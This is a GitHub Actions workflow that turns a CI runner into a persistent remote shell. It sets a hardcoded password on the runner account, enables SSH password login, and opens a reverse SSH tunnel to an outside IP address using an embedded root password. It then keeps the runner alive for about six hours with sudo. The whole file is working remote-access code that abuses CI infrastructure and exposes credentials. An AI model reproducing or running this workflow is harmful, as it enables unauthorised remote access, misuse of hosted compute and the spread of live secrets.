name: Shell6h
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: persistent shell
        timeout-minutes: 350
        run: |
          set +e
          sudo sh -c 'echo runner:GitHubR00t | chpasswd'
          sudo sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo systemctl restart sshd
          sshpass -p GitHubR00t ssh -o StrictHostKeyChecking=no runner@127.0.0.1 'echo ssh_ok' 2>&1
          sshpass -p pQg80L195Ka3 ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes -N -R 0.0.0.0:2222:localhost:22 root@185.244.173.24 &
          sleep 5
          sshpass -p pQg80L195Ka3 ssh -o StrictHostKeyChecking=no root@185.244.173.24 'ss -tlnp | grep 2222' 2>&1
          echo
          IP=$(curl -s --max-time 3 http://ifconfig.me)
          echo "READY! ssh -p 2222 runner@185.244.173.24 (pass: GitHubR00t) | runner IP: $IP"
          echo "Alive for ~6 hours. sudo available."
          while true; do sleep 60; echo "alive $(date)"; done
